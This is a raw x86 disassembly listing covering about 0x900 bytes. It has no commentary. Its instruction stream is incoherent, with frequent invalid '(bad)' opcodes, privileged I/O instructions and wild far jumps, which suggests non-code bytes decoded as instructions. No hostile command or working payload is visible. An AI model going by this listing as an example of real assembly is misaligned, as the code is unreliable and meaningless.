  42302d:	cld    
  42302e:	mov    esp,0xf9f5f3f9
  423033:	pop    es
  423034:	add    BYTE PTR [edi+eax*8],al
  423037:	cld    
  423038:	add    ebp,ebp
  42303a:	or     eax,0xb7c9f3c6
  42303f:	scas   al,BYTE PTR es:[edi]
  423040:	ret    
  423041:	in     al,dx
  423042:	mov    dl,0xd0
  423044:	ror    esi,cl
  423046:	mov    bh,0xd8
  423048:	fcmovnu st,st(1)
  42304a:	add    edi,edx
  42304c:	add    ebp,ebx
  42304e:	add    eax,0xd102babf
  423053:	or     edx,ebp
  423055:	out    dx,eax
  423056:	aam    0xe4
  423058:	in     al,dx
  423059:	clc    
  42305a:	or     dh,ah
  42305c:	loop   0x42302d
  42305e:	(bad)
  423061:	jmp    0x42304c
  423063:	jmp    0xd2f2:0xe4b5b7b4
  42306a:	mul    al
  42306c:	add    al,al
  42306e:	out    0xd1,eax
  423070:	fcmovb st,st(7)
  423072:	call   esp
  423074:	(bad)  
  423075:	push   cs
  423076:	pop    es
  423077:	(bad)
  42307a:	add    edx,esi
  42307c:	lock lock lock div ecx
  423081:	aad    0xd1
  423083:	shl    ah,1
  423085:	jmp    0x423057
  423087:	rol    ah,cl
  423089:	fcomp  st(4)
  42308b:	out    dx,eax
  42308c:	div    esp
  42308e:	into   
  42308f:	shl    edx,1
  423091:	clc    
  423092:	vcmpss xmm1,xmm3,DWORD PTR [ebx],0xfa
  423097:	cli    
  423098:	push   es
  423099:	retf   0xd8c8
  42309c:	mov    cl,0xe6
  42309e:	lock stos DWORD PTR es:[edi],eax
  4230a0:	int3   
  4230a1:	in     al,0xc2
  4230a3:	(bad)  
  4230a5:	into   
  4230a6:	retf   
  4230a7:	jmp    0x423094
  4230a9:	(bad)  
  4230ab:	into   
  4230ac:	mov    edx,0xf3f5e0d0
  4230b1:	add    eax,edx
  4230b3:	fadd   QWORD PTR [ebx+ebx*8]
  4230b6:	cli    
  4230b7:	dec    DWORD PTR [ebx]
  4230b9:	loopne 0x4230bd
  4230bb:	retf   
  4230bc:	out    0xf2,eax
  4230be:	shr    BYTE PTR [esi-0xd1a2c13],0xd7
  4230c5:	mov    ecx,0x2bdffeb
  4230ca:	iret   
  4230cb:	in     eax,dx
  4230cc:	out    0xef,eax
  4230ce:	fmulp  st(5),st
  4230d0:	call   ebp
  4230d2:	fadd   st,st(1)
  4230d4:	aad    0xd4
  4230d6:	fisttp QWORD PTR ds:0xf1dd04ca
  4230dc:	mov    edi,0xc8ecd5b7
  4230e1:	mov    bl,0xc9
  4230e3:	mov    ch,0xb8
  4230e5:	jmp    0x420ca3
  4230ea:	repnz into 
  4230ec:	icebp  
  4230ed:	add    edx,ebp
  4230ef:	int    0xf2
  4230f1:	fcmovbe st,st(6)
  4230f3:	(bad)  
  4230f4:	aad    0xe5
  4230f6:	fneni(8087 only) 
  4230f8:	iret   
  4230f9:	add    eax,ebp
  4230fb:	shl    bl,0xea
  4230fe:	(bad)  
  4230ff:	(bad)  
  423100:	scas   al,BYTE PTR es:[edi]
  423101:	leave  
  423102:	(bad)  
  423103:	int    0xb0
  423105:	fcmovne st,st(1)
  423107:	aam    0xde
  423109:	mov    edi,0xbed7ffcc
  42310e:	mov    esi,0xf9e1e601
  423113:	test   dl,0xf6
  423116:	enter  0xf8c4,0xee
  42311a:	adc    dh,bl
  42311c:	(bad)  
  42311d:	lods   eax,DWORD PTR ds:[esi]
  42311e:	mov    cl,0xd1
  423120:	into   
  423121:	retf   0xdbe2
  423124:	jmp    0x423111
  423126:	clc    
  423127:	int3   
  423128:	sar    DWORD PTR [edx-0x240e0617],1
  42312e:	add    edi,DWORD PTR [edi-0x1639f509]
  423134:	jmp    esi
  423136:	mul    al
  423138:	add    al,0xda
  42313a:	fcmovb st,st(5)
  42313c:	jmp    0xe4d1:0xb1eedecb
  423143:	(bad)
  423146:	call   0xd620e41f
  42314b:	loope  0x423128
  42314d:	rcl    eax,0xff
  423150:	out    0x2,al
  423152:	pop    es
  423153:	cmc    
  423154:	add    bh,bh
  423156:	jmp    0xa281b65
  42315b:	jmp    0x42313d
  42315d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42315e:	loop   0x423112
  423160:	mul    ecx
  423162:	mov    dl,0xaf
  423164:	(bad)  
  423165:	shl    ah,1
  423167:	div    bl
  423169:	leave  
  42316a:	loope  0x423165
  42316c:	std    
  42316d:	clc    
  42316e:	add    esp,esp
  423170:	int3   
  423171:	cli    
  423172:	add    edx,ebp
  423174:	lock push cs
  423176:	out    dx,al
  423177:	cld    
  423178:	cli    
  423179:	cli    
  42317a:	in     al,dx
  42317b:	lock fdivrp st(1),st
  42317e:	scas   al,BYTE PTR es:[edi]
  42317f:	shr    edx,cl
  423181:	out    0xdb,al
  423183:	(bad)
  423186:	jmp    0xf211075c
  42318b:	sar    ch,1
  42318d:	mov    ch,0xbe
  42318f:	cli    
  423190:	add    eax,eax
  423192:	rol    dl,1
  423194:	test   DWORD PTR [eax],0xc1dc0907
  42319a:	push   DWORD PTR [ecx-0xa15112d]
  4231a0:	imul   ebp
  4231a2:	int    0xaf
  4231a4:	fcmove st,st(4)
  4231a6:	cli    
  4231a7:	leave  
  4231a8:	aad    0xca
  4231aa:	repz repz out dx,eax
  4231ad:	(bad)  
  4231ae:	fstp   st(0)
  4231b0:	lock (bad) 
  4231b3:	(bad)  
  4231b4:	cld    
  4231b5:	(bad)  
  4231b6:	pop    es
  4231b7:	add    BYTE PTR [esi],al
  4231b9:	cli    
  4231ba:	clc    
  4231bb:	mov    esi,0xcde3f1e9
  4231c0:	lock sar DWORD PTR [ebx-0x26041246],cl
  4231c7:	int    0xed
  4231c9:	mov    edi,0xe2cce9e2
  4231ce:	fcomip st,st(3)
  4231d0:	cli    
  4231d1:	aam    0xd8
  4231d3:	add    BYTE PTR [esi],al
  4231d5:	push   es
  4231d6:	pop    es
  4231d7:	(bad)  
  4231d8:	hlt    
  4231d9:	fucomi st,st(5)
  4231db:	fnstsw WORD PTR [edi+ebp*4-0xc524f0b]
  4231e2:	out    0xc9,eax
  4231e4:	mov    ebx,0xddfbd7d9
  4231e9:	leave  
  4231ea:	std    
  4231eb:	in     eax,dx
  4231ec:	out    dx,al
  4231ed:	xlat   BYTE PTR ds:[ebx]
  4231ee:	sar    esp,0xc6
  4231f1:	mov    bh,0xf9
  4231f4:	fidivr WORD PTR [ebp-0x1e2500fc]
  4231fa:	add    al,0xc0
  4231fc:	int3   
  4231fd:	retf   0xcde2
  423200:	into   
  423201:	(bad)  
  423202:	into   
  423203:	mov    ebx,0xc5fbe5d9
  423208:	repnz aad 0xf3
  42320b:	loop   0x4231c9
  42320d:	int    0xd4
  42320f:	aam    0xbd
  423211:	neg    esp
  423213:	ret    
  423214:	(bad)  
  423215:	(bad)  
  423217:	hlt    
  423218:	adc    ecx,DWORD PTR ds:0xdda8cb11
  42321e:	out    dx,al
  42321f:	les    esi,FWORD PTR [eax-0x63b3145]
  423225:	mov    ch,0xee
  423227:	in     al,0xc9
  423229:	mov    edx,0xdcbedffc
  42322e:	fld    DWORD PTR ds:0xf8f7c2d5
  423234:	add    ecx,DWORD PTR [esi]
  423236:	add    al,0xfd
  423238:	sti    
  423239:	in     eax,0xcd
  42323b:	lock mov eax,0xe3f1f5ee
  423241:	(bad)  
  423242:	hlt    
  423243:	iret   
  423244:	stc    
  423245:	fcmove st,st(5)
  423247:	mov    edi,0xd1b9fbbb
  42324c:	out    dx,al
  42324d:	xlat   BYTE PTR ds:[ebx]
  42324e:	std    
  42324f:	(bad)  
  423250:	mov    ebp,0xd00205e5
  423255:	jmp    0xe9363e62
  42325a:	paddsb mm1,mm5
  42325d:	shl    ch,1
  42325f:	(bad)  
  423260:	shr    eax,1
  423262:	ret    0xc6f1
  423265:	jmp    0xf61de969
  42326a:	into   
  42326b:	fcmovbe st,st(3)
  42326d:	repnz sar cl,1
  423270:	sar    edi,0x0
  423273:	leave  
  423274:	in     al,0xd7
  423276:	iret   
  423277:	(bad)  
  423278:	fmul   DWORD PTR [edx+eiz*8]
  42327b:	loopne 0x423266
  42327d:	(bad)  [eax-0x3616302a]
  423283:	mov    ah,0xe4
  423285:	sti    
  423286:	test   edx,0xf4faf4f5
  42328c:	shl    ecx,1
  42328e:	sar    bh,1
  423290:	(bad)  
  423292:	loopne 0x42328d
  423294:	pop    es
  423295:	neg    ecx
  423297:	(bad)  
  423298:	repz dec al
  42329b:	stos   BYTE PTR es:[edi],al
  42329c:	lock int3 
  42329e:	mov    esp,0xacf1b6d3
  4232a3:	mov    bl,0xdf
  4232a5:	mov    eax,0xebf0cdf6
  4232aa:	enter  0xf0ff,0xe3
  4232ae:	repz icebp 
  4232b0:	(bad)  
  4232b1:	loopne 0x4232b9
  4232b3:	rol    DWORD PTR [eax],0xda
  4232b6:	(bad)  
  4232b8:	loopne 0x42329f
  4232ba:	retf   0xc9ac
  4232bd:	test   dh,0xd4
  4232c0:	shl    BYTE PTR [edx-0x21182a2c],cl
  4232c6:	lock in al,0xd4
  4232c9:	mov    esi,0x2c8beb4
  4232ce:	in     eax,dx
  4232cf:	(bad)  
  4232d1:	fstp   st(7)
  4232d3:	leave  
  4232d4:	add    ebp,ebx
  4232d6:	add    al,0xfe
  4232d8:	int    0xf9
  4232da:	iret   
  4232db:	int3   
  4232dc:	jmp    0xe7b7:0xcecfe5f7
  4232e3:	(bad)  
  4232e4:	jmp    0x423297
  4232e6:	jmp    0xdaf1:0xd4feded2
  4232ed:	repnz mov edi,0xc4b905fd
  4232f3:	loop   0x4232f1
  4232f5:	cld    
  4232f6:	pop    es
  4232f7:	add    ch,al
  4232f9:	retf   
  4232fa:	loopne 0x4232d4
  4232fc:	lods   al,BYTE PTR ds:[esi]
  4232fd:	jecxz  0x4232f6
  4232ff:	jmp    0x4232e6
  423301:	fcmove st,st(5)
  423303:	leave  
  423304:	mov    ecx,0xdef3f3d9
  423309:	jecxz  0x4232e1
  42330b:	enter  0xe7dc,0xfd
  42330f:	cli    
  423310:	shl    ebx,0xfd
  423313:	or     al,BYTE PTR [ecx]
  423315:	(bad)  
  423317:	out    0xca,eax
  423319:	add    bh,bl
  42331b:	bnd jmp 0x423311
  42331e:	out    dx,al
  42331f:	xlat   BYTE PTR ds:[ebx]
  423320:	retf   
  423321:	(bad)  
  423322:	in     eax,dx
  423323:	fcomi  st,st(2)
  423325:	int    0xd5
  423327:	(bad)
  42332a:	(bad)  
  42332c:	mov    ebp,0xd4bfcdef
  423331:	out    0xf5,al
  423333:	test   BYTE PTR [ecx],0xc7
  423336:	pavgw  mm0,mm6
  423339:	loopne 0x42331b
  42333b:	mov    bl,0xc4
  42333d:	mov    cl,0xf6
  42333f:	aam    0xec
  423341:	shr    bl,cl
  423343:	mov    ecx,0xd2d7f0d0
  423348:	stc    
  423349:	shr    ebp,cl
  42334b:	icebp  
  42334c:	cld    
  42334d:	fidivr DWORD PTR [eax-0x15211e44]
  423353:	(bad)  
  423354:	(bad)  
  423356:	add    ebx,ebp
  423358:	fninit 
  42335a:	fsubr  QWORD PTR [ebx-0x42491c22]
  423360:	repnz hlt 
  423362:	(bad)  
  423364:	jmp    0x42334a
  423366:	mov    ch,0xda
  423368:	mov    ah,0xd8
  42336a:	call   0xcd360371
  42336f:	add    eax,0x3d1d4e6
  423374:	vshufps xmm0,xmm3,XMMWORD PTR ds:0xe4f202d9,0xf1
  42337d:	mov    bl,0xf5
  42337f:	in     al,0xee
  423381:	in     eax,0xcd
  423383:	sti    
  423384:	lock (bad) 
  423386:	shl    edi,cl
  423388:	clc    
  423389:	cmc    
  42338a:	enter  0xccee,0xc0
  42338e:	fcmovne st,st(4)
  423390:	or     edi,edi
  423392:	cld    
  423393:	test   DWORD PTR [ecx],0xe5f8e4f6
  423399:	add    ebp,esp
  42339b:	call   0xf2161b6e
  4233a0:	ror    ebx,0xe5
  4233a3:	loope  0x42336c
  4233a5:	(bad)  
  4233a7:	mov    bl,0xf9
  4233a9:	jecxz  0x423381
  4233ab:	ffreep st(1)
  4233ad:	std    
  4233ae:	mov    esi,0xd902f0f0
  4233b3:	inc    DWORD PTR [eax]
  4233b5:	fdiv   st,st(4)
  4233b7:	jecxz  0x4233cc
  4233b9:	into   
  4233ba:	add    edx,eax
  4233bc:	shr    ch,1
  4233be:	repnz iret 
  4233c0:	fdiv   QWORD PTR [ebp-0x20202d25]
  4233c6:	div    DWORD PTR [ebx-0x3043534]
  4233cc:	repz loop 0x4233c6
  4233cf:	out    0xdb,eax
  4233d1:	xlat   BYTE PTR ds:[ebx]
  4233d2:	frndint 
  4233d4:	aam    0xf6
  4233d6:	into   
  4233d7:	pop    es
  4233d8:	inc    esp
  4233da:	(bad)  
  4233dc:	icebp  
  4233dd:	mov    esp,0xd0d5abc9
  4233e2:	ret    0xeeb1
  4233e5:	mov    bh,0xe9
  4233e7:	cmc    
  4233e8:	(bad)  
  4233e9:	int    0xf1
  4233eb:	stc    
  4233ec:	stc    
  4233ed:	ret    0xd2b8
  4233f0:	loop   0x4233b4
  4233f2:	cld    
  4233f3:	fsubp  st(0),st
  4233f5:	call   0xf931f7ef
  4233fa:	add    ecx,ebp
  4233fc:	icebp  
  4233fd:	shr    esi,cl
  4233ff:	iret   
  423400:	mov    esp,0xffb5f2e0
  423405:	(bad)  
  423407:	mov    ah,0xe4
  423409:	shr    dh,cl
  42340b:	mov    ebx,0xecda02fb
  423410:	xlat   BYTE PTR ds:[ebx]
  423411:	pop    es
  423412:	add    eax,DWORD PTR ds:0xc80fc0be
  423418:	add    eax,0xc0aff9c1
  42341d:	fdiv   QWORD PTR [esi-0x11121115]
  423423:	call   0xe91c04f3
  423428:	mov    dl,0x3
  42342a:	sti    
  42342b:	call   0xbe3c0923
  423430:	mul    dh
  423432:	cmc    
  423433:	cld    
  423434:	loopne 0x423440
  423436:	add    ecx,edx
  423438:	jmp    0xc1f21935
  42343d:	(bad)
  423440:	mov    bl,0xee
  423442:	hlt    
  423443:	shr    edx,1
  423445:	out    dx,eax
  423446:	(bad)  
  423447:	(bad)  
  423448:	(bad)  
  423449:	mov    eax,0xbffbb9ff
  42344e:	in     al,dx
  42344f:	push   es
  423450:	in     al,dx
  423451:	rcr    ebp,1
  423453:	aam    0xff
  423455:	(bad)  
  423457:	or     al,0xea
  423459:	sti    
  42345a:	in     eax,dx
  42345b:	repnz iret 
  42345d:	test   eax,0xcaadf3ad
  423462:	enter  0xceeb,0xdf
  423466:	mov    bh,0xf8
  423468:	fild   DWORD PTR [ebx]
  42346a:	idiv   ch
  42346c:	mov    edx,0xf903dfbc
  423471:	mov    ecx,0xf8fe07c2
  423476:	dec    DWORD PTR ds:0xe0eafbfc
  42347c:	mov    dl,0xa5
  42347e:	mov    esi,0xe5d1b0c6
  423483:	mov    dh,0xec
  423485:	in     al,0xf3
  423487:	fistp  QWORD PTR [edx-0x1f0f1e14]
  42348d:	int    0xe2
  42348f:	add    eax,0xbfe0e4f4
  423494:	std    
  423495:	push   cs
  423496:	or     eax,0xfacde40e
  42349b:	mov    cl,0xea
  42349d:	loope  0x42348a
  42349f:	repz mov al,0xca
  4234a2:	xlat   BYTE PTR ds:[ebx]
  4234a3:	mov    ebx,0xf4f4d3d4
  4234a8:	neg    eax
  4234aa:	mov    ecx,0xccb5f1ec
  4234af:	add    eax,0xe3c4e4c2
  4234b4:	(bad)  
  4234b5:	jmp    0xeff3:0x3fbc5f8
  4234bc:	lods   al,BYTE PTR ds:[esi]
  4234bd:	retf   0xb5ec
  4234c0:	lock int 0xcc
  4234c3:	xlat   BYTE PTR ds:[ebx]
  4234c4:	iret   
  4234c5:	mov    dh,0xf9
  4234c7:	lds    edi,FWORD PTR [edi-0xd2b300c]
  4234cd:	add    bl,ch
  4234cf:	cld    
  4234d0:	sar    BYTE PTR [ecx+0xc405d0],0xce
  4234d7:	dec    BYTE PTR [eax]
  4234d9:	adc    ebp,ecx
  4234db:	repz call 0xcc1317c7
  4234e1:	ret    
  4234e2:	aad    0xcf
  4234e4:	lock fcomip st,st(2)
  4234e7:	cmc    
  4234e8:	int    0xf6
  4234ea:	fcomi  st,st(2)
  4234ec:	rcl    eax,1
  4234ee:	loopne 0x4234e1
  4234f0:	fnstsw WORD PTR [ecx+0xbfcf7fd]
  4234f6:	(bad)  
  4234f7:	retf   0xeb06
  4234fa:	rol    esp,cl
  4234fc:	repz test eax,0xcbbcf3c1
  423502:	jmp    0xe02134eb
  423507:	(bad)  
  423508:	add    edi,edx
  42350a:	mov    ecx,0x6e2b9d2
  42350f:	push   es
  423510:	jmp    0x4234d4
  423512:	icebp  
  423513:	ret    
  423514:	or     esi,edx
  423516:	loopne 0x42351a
  423518:	fdivr  st,st(2)
  42351a:	or     eax,0xe7d3e6d1
  42351f:	mov    bh,0xd1
  423521:	(bad)  
  423522:	in     al,0xf8
  423524:	shr    esp,cl
  423526:	jmp    0xfb140a16
  42352b:	fcmovnbe st,st(1)
  42352d:	ret    
  42352e:	div    bl
  423530:	fmul   st(3),st
  423532:	add    ebp,esp
  423534:	out    0xd6,eax
  423536:	add    bh,ch
  423538:	retf   0xdf03
  42353b:	stos   BYTE PTR es:[edi],al
  42353c:	jmp    0x42351d
  42353e:	mov    ebp,0xe4eab6f2
  423543:	shr    ch,0xd4
  423546:	mov    ecx,0xbeb9f8b3
  42354b:	rcr    ebp,1
  42354d:	idiv   al
  42354f:	vpslld xmm0,xmm4,XMMWORD PTR [edi]
  423553:	aam    0xeb
  423555:	retf   0x7f5
  423558:	jmp    0x423549
  42355a:	or     bl,bh
  42355c:	(bad)
  42355f:	mov    ch,0xcb
  423561:	icebp  
  423562:	retf   0xc6fb
  423565:	(bad)  
  423567:	mov    ebp,0xf2bef7bb
  42356c:	fdiv   DWORD PTR [ebp-0x2d0d3330]
  423572:	or     ecx,edi
  423574:	push   esi
  423576:	fldz   
  423578:	pop    es
  423579:	(bad)  
  42357a:	fcmovb st,st(0)
  42357c:	mov    esp,0xfbe0afeb
  423581:	mov    cl,0xe4
  423583:	mov    ah,0xe5
  423585:	fcmove st,st(3)
  423587:	cmc    
  423588:	sti    
  423589:	repz icebp 
  42358b:	rcl    esp,0xfb
  42358e:	fcomip st,st(6)
  423590:	cld    
  423591:	add    al,0xc0
  423593:	(bad)  
  423594:	loope  0x423576
  423596:	jmp    0xb320d9b
  42359b:	stos   DWORD PTR es:[edi],eax
  42359c:	stos   BYTE PTR es:[edi],al
  42359d:	call   0xc3ecfa87
  4235a2:	fcmove st,st(4)
  4235a4:	xlat   BYTE PTR ds:[ebx]
  4235a5:	cli    
  4235a6:	mov    ecx,0xf1ccf8fd
  4235ab:	mov    esi,0xfbd7d7c0
  4235b0:	sar    esp,0xdd
  4235b3:	fcmovnbe st,st(4)
  4235b5:	cli    
  4235b6:	in     eax,0xc7
  4235b8:	fmul   st(3),st
  4235ba:	fsub   st,st(7)
  4235bc:	scas   eax,DWORD PTR es:[edi]
  4235bd:	mov    bh,0xdd
  4235bf:	mov    dh,0xc4
  4235c1:	(bad)  
  4235c2:	mov    bh,0xe6
  4235c4:	(bad)  
  4235c7:	mov    ch,0xd7
  4235c9:	mov    ebx,0x7facfcd
  4235ce:	in     eax,dx
  4235cf:	shl    cl,0xc2
  4235d2:	or     ebx,esp
  4235d4:	in     al,0xfd
  4235d6:	in     eax,dx
  4235d7:	(bad)  
  4235d9:	repnz loope 0x42359b
  4235dc:	shl    edx,1
  4235de:	fadd   st(7),st
  4235e0:	enter  0xcfe9,0xe1
  4235e4:	retf   0xe4fa
  4235e7:	jmp    0xd4b9:0xc2f9f2df
  4235ee:	test   DWORD PTR [esi],0xf40af0c4
  4235f4:	ret    0xee03
  4235f7:	add    ecx,DWORD PTR [edx]
  4235f9:	shr    ebx,cl
  4235fb:	repz fsubr DWORD PTR [ecx-0x3f1b161b]
  423602:	out    dx,eax
  423603:	repnz repz fdecstp 
  423607:	sar    DWORD PTR [edi+edx*8-0x2f3f0d26],1
  42360e:	std    
  42360f:	ffree  st(7)
  423611:	rol    cl,0xbf
  423614:	stc    
  423615:	hlt    
  423616:	fmul   QWORD PTR [eax]
  423618:	fild   DWORD PTR [esi]
  42361a:	int3   
  42361b:	rcl    cl,cl
  42361d:	fbstp  TBYTE PTR [esi-0x50a4d50]
  423623:	(bad)  
  423624:	mov    bh,0xe5
  423626:	(bad)  
  423627:	cmc    
  423628:	mov    ah,0xf3
  42362a:	aad    0xba
  42362c:	mov    edi,0xf5e1e0d9
  423631:	loop   0x42363e
  423633:	(bad)  
  423634:	(bad)  
  423635:	call   0xed29413c
  42363a:	sar    DWORD PTR [ebp-0x2a193f15],cl
  423640:	jmp    0xe8ff:0xd2d9c5f3
  423647:	(bad)  
  423648:	(bad)  
  423649:	jmp    0x42363e
  42364b:	fmulp  st(6),st
  42364d:	(bad)  
  42364f:	clc    
  423650:	loopne 0x42363d
  423652:	shl    edi,1
  423654:	(bad)  
  423656:	(bad)
  423659:	adc    edx,DWORD PTR [ebx]
  42365b:	jmp    0xad0c2120
  423660:	aad    0xad
  423662:	(bad)  
  423663:	mov    edx,0xbfebf6fa
  423668:	in     al,0xf5
  42366a:	enter  0xcd00,0xf6
  42366e:	add    bh,bl
  423670:	jmp    0x42364e
  423672:	mov    esp,0xde5f00b
  423677:	fsubr  st,st(4)
  423679:	shr    ecx,cl
  42367b:	into   
  42367c:	(bad)  
  42367d:	icebp  
  42367e:	mov    bl,0xf2
  423680:	shr    DWORD PTR [ebp-0xb303846],0xac
  423687:	rcr    ecx,cl
  423689:	clc    
  42368a:	fnstsw WORD PTR [ecx-0x18fd2311]
  423690:	add    DWORD PTR [ebx],eax
  423692:	in     al,0xda
  423694:	hlt    
  423695:	push   cs
  423696:	(bad)  
  423697:	retf   
  423698:	loopne 0x42365f
  42369a:	shl    cl,cl
  42369c:	leave  
  42369d:	jmp    0xb3e2:0xcaccd3c2
  4236a4:	jmp    0xdf3d3696
  4236a9:	in     eax,dx
  4236aa:	lock frndint 
  4236ad:	lock (bad) 
  4236af:	out    0x5,eax
  4236b1:	jmp    0xe0cf:0xefc1fed6
  4236b8:	(bad)  
  4236b9:	loop   0x4236cc
  4236bb:	(bad)  
  4236bd:	iret   
  4236be:	mov    esp,0xb7e5aec9
  4236c3:	fcmovne st,st(6)
  4236c5:	xlat   BYTE PTR ds:[ebx]
  4236c6:	stc    
  4236c7:	mov    dh,0xfc
  4236c9:	mov    ecx,0xc1e2e3fb
  4236ce:	stc    
  4236cf:	add    eax,0x6f7eae6
  4236d4:	retf   
  4236d5:	pop    es
  4236d6:	add    ch,cl
  4236d8:	add    edx,ebp
  4236da:	clc    
  4236db:	out    dx,eax
  4236dc:	repz sar BYTE PTR [esi-0x45284a1f],1
  4236e3:	rcl    esp,cl
  4236e5:	mov    al,0xd7
  4236e7:	mov    ebx,0xe1eccfd4
  4236ec:	cli    
  4236ed:	jmp    ebx
  4236ef:	repz fiadd DWORD PTR [eax]
  4236f2:	jecxz  0x4236fa
  4236f4:	(bad)  
  4236f5:	(bad)  
  4236f6:	out    dx,al
  4236f7:	push   es
  4236f8:	repz add esp,ebx
  4236fb:	int    0xaa
  4236fd:	int3   
  4236fe:	shl    edi,1
  423700:	out    dx,al
  423701:	into   
  423702:	idiv   ecx
  423704:	test   cl,0xdf
  423707:	repnz int3 
  423709:	in     eax,dx
  42370a:	loope  0x4236ed
  42370c:	ret    0xdefe
  42370f:	lock fst st(6)
  423712:	rol    DWORD PTR [ecx],0xca
  423715:	or     ecx,ebp
  423717:	push   cs
  423718:	add    ebx,ebp
  42371a:	call   0xd1f203c9
  42371f:	mov    dl,0xd0
  423721:	shl    DWORD PTR [edi-0x4f272b3c],0xd2
  423728:	in     al,dx
  423729:	(bad)  
  42372a:	(bad)  
  42372b:	(bad)  
  42372c:	rcl    edi,1
  42372e:	div    edi
  423730:	rcl    ah,0xbc
  423733:	(bad)  
  423734:	jmp    0xed0d:0xe0cbc5e4
  42373b:	icebp  
  42373c:	mov    bl,0xd7
  42373e:	mov    cl,0xf6
  423740:	repnz loope 0x423731
  423743:	mov    dh,0xd8
  423745:	lock jmp 0xfae9:0xdfdbf0b5
  42374d:	std    
  42374e:	add    ah,bl
  423750:	(bad)  
  423752:	shl    eax,1
  423754:	add    al,0xf7
  423756:	jecxz  0x423725
  423758:	ret    0x1e9
  42375b:	sar    BYTE PTR [edi-0x52181b1a],cl
  423761:	jmp    0x423718
  423763:	out    0xea,al
  423765:	fxch   st(4)
  423767:	in     eax,0xf1
  423769:	retf   0xf6b4
  42376c:	fiadd  WORD PTR [edi]
  42376e:	mov    eax,0xc2e4c4c2
  423773:	(bad)  
  423775:	retf   
  423776:	add    ecx,DWORD PTR [esi]
  423778:	or     bl,bl
  42377a:	enter  0xefdd,0xc5
  42377e:	ret    0xade1
  423781:	aad    0xb3
  423783:	mov    eax,0xbbf7b8c5
  423789:	out    dx,eax
  42378a:	div    cl
  42378c:	aad    0xcc
  42378e:	(bad)  
  423790:	fdivr  QWORD PTR [eax+ebx*8-0x27190237]
  423797:	into   
  423798:	or     edi,ebx
  42379a:	add    DWORD PTR [ebx-0x3113504e],ebp
  4237a0:	rol    bl,1
  4237a2:	loop   0x423759
  4237a4:	into   
  4237a5:	(bad)  
  4237a6:	out    dx,al
  4237a7:	retf   0xcad8
  4237aa:	rcl    bl,1
  4237ac:	clc    
  4237ad:	ror    ah,1
  4237af:	in     al,dx
  4237b0:	sti    
  4237b1:	(bad)  
  4237b3:	or     edx,edi
  4237b5:	loop   0x42377e
  4237b7:	in     eax,dx
  4237b8:	out    dx,al
  4237b9:	or     eax,DWORD PTR [eax]
  4237bb:	ror    eax,1
  4237bd:	(bad)  
  4237bf:	scas   al,BYTE PTR es:[edi]
  4237c0:	loop   0x4237b9
  4237c2:	mov    ah,0xcc
  4237c4:	(bad)  
  4237c5:	jmp    0x4237b5
  4237c7:	std    
  4237c8:	add    edx,eax
  4237ca:	mov    ah,0xd0
  4237cc:	bnd ret 
  4237ce:	hlt    
  4237cf:	(bad)  
  4237d2:	repnz fisttp QWORD PTR [edi]
  4237d5:	add    esi,esi
  4237d7:	or     al,0xcc
  4237d9:	loopne 0x4237ae
  4237db:	retf   
  4237dc:	shl    edx,0xce
  4237df:	out    0xd4,eax
  4237e1:	into   
  4237e2:	(bad)  
  4237e3:	leave  
  4237e4:	push   DWORD PTR [ebp-0x35320322]
  4237ea:	mov    ebp,0xd8beb8dd
  4237ef:	int3   
  4237f0:	(bad)  
  4237f2:	clc    
  4237f3:	add    BYTE PTR ds:0xd904e2dd,al
  4237f9:	add    al,0xe2
  4237fb:	mov    edi,0xe9f2b3d0
  423800:	int    0xd5
  423802:	sar    DWORD PTR [ecx-0x3b4b190e],cl
  423808:	lock jecxz 0x423808
  42380b:	aam    0xfc
  42380d:	icebp  
  42380e:	ret    0xbccd
  423811:	(bad)  
  423812:	in     eax,0x7
  423814:	mov    esi,0xcf020efe
  423819:	add    al,0xeb
  42381b:	repz idiv DWORD PTR [esi-0x18170f38]
  423822:	mov    edx,0xe6d8c7cd
  423827:	mov    ecx,0xe3cfd8d5
  42382c:	mov    dh,0xce
  42382e:	mov    edi,0xfbbcddd7
  423833:	(bad)  
  423835:	test   edx,0xe403c9de
  42383b:	rcr    bh,1
  42383d:	leave  
  42383e:	jmp    0x423811
  423840:	aam    0xe3
  423842:	mov    bl,0xdb
  423844:	div    esp
  423846:	jmp    0xc1e8:0xfed0d2d2
  42384d:	jecxz  0x423842
  42384f:	hlt    
  423850:	lock (bad) 
  423853:	or     ch,al
  423855:	cmc    
  423856:	add    al,0xef
  423858:	prefetchwt1 BYTE PTR [ebx]
  42385b:	loopne 0x42381f
  42385d:	test   al,0xca
  42385f:	jmp    0xecb1:0xe6caf5ce
  423866:	jmp    0xf3fb:0xc2ebf6df
  42386d:	shl    edi,1
  42386f:	clc    
  423870:	add    bl,cl
  423872:	sar    ebx,1
  423874:	add    al,0xef
  423876:	or     cl,bl
  423878:	clc    
  423879:	add    cl,ch
  42387b:	shl    eax,cl
  42387d:	out    0xf2,eax
  42387f:	(bad)
  423883:	icebp  
  423884:	fcmovnb st,st(7)
  423886:	lods   al,BYTE PTR ds:[esi]
  423887:	std    
  423888:	(bad)  
  42388a:	repnz jecxz 0x423882
  42388d:	fidivr WORD PTR [esi-0x2139f839]
  423893:	imul   cl
  423895:	retf   0xe7f9
  423898:	(bad)  
  423899:	movntq (bad),mm5
  42389a:	out    0xed,eax
  42389c:	lods   eax,DWORD PTR ds:[esi]
  42389d:	jecxz  0x423883
  42389f:	rcl    edi,1
  4238a1:	leave  
  4238a2:	ror    dl,cl
  4238a4:	mov    ebx,0xfbd4ebd1
  4238a9:	shl    cl,1
  4238ab:	(bad)  
  4238ad:	out    dx,al
  4238ae:	ret    
  4238af:	(bad)  
  4238b0:	(bad)  
  4238b2:	loope  0x42387d
  4238b4:	fsub   st(6),st
  4238b6:	(bad)
  4238b9:	fucomp st(4)
  4238bb:	ror    ah,0xce
  4238be:	in     al,dx
  4238bf:	repz mov dh,0xdb
  4238c2:	rcl    ebx,0xfa
  4238c5:	(bad)  
  4238c7:	in     eax,dx
  4238c8:	(bad)  
  4238ca:	(bad)  
  4238cb:	shr    esi,cl
  4238cd:	mov    ch,0xfd
  4238cf:	mov    esp,0xffffdac6
  4238d4:	fimul  DWORD PTR [esi]
  4238d6:	in     al,0xe5
  4238d8:	in     eax,0xdc
  4238da:	fsubr  QWORD PTR [eax-0x170e5157]
  4238e0:	jecxz  0x4238c4
  4238e2:	jmp    0xf02e14cf
  4238e7:	mov    bl,0xba
  4238e9:	stc    
  4238ea:	icebp  
  4238eb:	cmc    
  4238ec:	repnz in al,dx
  4238ee:	int    0xfe
  4238f0:	stc    
